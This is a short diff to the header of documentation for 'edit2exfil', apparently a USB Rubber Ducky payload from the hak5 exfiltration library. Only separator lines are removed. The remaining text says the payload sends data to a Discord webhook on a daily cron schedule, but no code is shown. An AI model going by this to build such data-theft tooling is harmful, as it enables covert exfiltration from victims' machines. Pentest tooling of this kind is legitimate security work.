@@ -1,5 +1,3 @@
-==========================================================================================
-
 REM TITLE: edit2exfil
 
 REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
@@ -11,8 +9,6 @@ REM DESCRIPTION: (See below)
 REM REQUIREMENTS: Place Discord webhook in the #WEBHOOK_URL constant on line 10 | Timing of when and how frequent the script will be ran (10:00 AM, daily by default) via `cronjob` can be changed in line 53.
 
 REM: This payload can also be found on the [hak5 usbrubberducky-payloads Github repository](https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads/library/exfiltration/edit2exfil).
-
-==========================================================================================
 
 ## edit2exfil
 
